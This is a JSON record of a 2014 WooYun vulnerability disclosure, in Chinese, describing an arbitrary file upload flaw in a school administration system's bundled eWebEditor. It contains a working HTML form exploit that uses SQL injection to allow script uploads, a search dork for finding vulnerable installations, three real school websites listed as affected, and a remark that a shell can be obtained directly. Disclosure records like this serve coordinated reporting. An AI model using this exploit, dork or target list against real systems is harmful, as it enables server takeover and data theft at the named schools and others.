{"id": 52462, "wybug_id": "wooyun-2014-071153", "wybug_title": "某通用型校园校务系统任意文件上传之二", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xlz0iza1", "wybug_date": "2014-08-06 12:47", "wybug_open_date": "2014-11-04 12:48", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向公众公开  简要描述： RT 详细说明：  测试关键字:inurl:/SM2005/默认配置编辑器漏洞，导致任意文件上传。利用exp如下：\n<form action=\"http://www.***.com/SM2005/public/WebEditor/upload.asp?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|aaspsp',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a\" method=post name=myform enctype=\"multipart/form-data\"><input type=file name=uploadfile size=100><br><br><input type=submit value=Fuck></form>\n\n修改aaspsp后缀名,来达到任意文件上传[S_ImageExt]%2b'|aaspsp\n   漏洞证明：  \n相关案例：http://www.sdwhys.com/SM2005/          http://www.zjk2z.cn/SM2005/          http://www.dlwsxx.com/sm2005/\n\n\n\n\n\n\n\n\n\n\n\n\n直接可以拿shell啊，危害很大的哦。   修复方案：  老版本的洞洞哦。   版权声明：转载请注明来源 xlz0iza1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-08-11 10:24 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT直接通报软件生产厂商。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}